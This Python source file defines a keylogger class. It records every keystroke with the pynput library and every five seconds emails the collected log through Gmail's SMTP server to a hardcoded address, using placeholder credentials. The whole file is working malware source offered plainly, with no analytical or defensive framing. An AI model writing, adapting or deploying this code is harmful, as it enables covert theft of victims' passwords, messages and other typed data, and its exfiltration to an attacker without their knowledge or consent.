#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText

class Keylogger:

    def __init__(self):
        self.log = ""
        self.timer = None
        self.shutdown_request = False

    def process_key(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            self.log += " " if str(key) == "Key.space" else f" {str(key).split('.')[1].upper()} " 
        
        print(self.log)

    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

    def clear_log(self):
        self.send_email("Keylogger", self.log, "email@gmail.com", ['email@gmail.com'], "PASSWORD")
        self.log = ""

        if not self.shutdown_request:
            self.timer = threading.Timer(5, self.clear_log)
            self.timer.start()

    def shutdown(self):
        self.shutdown_request = True
        self.timer.cancel()

    def start(self):
        keylogger = pynput.keyboard.Listener(on_press=self.process_key)

        with keylogger:
            self.clear_log()
            keylogger.join()
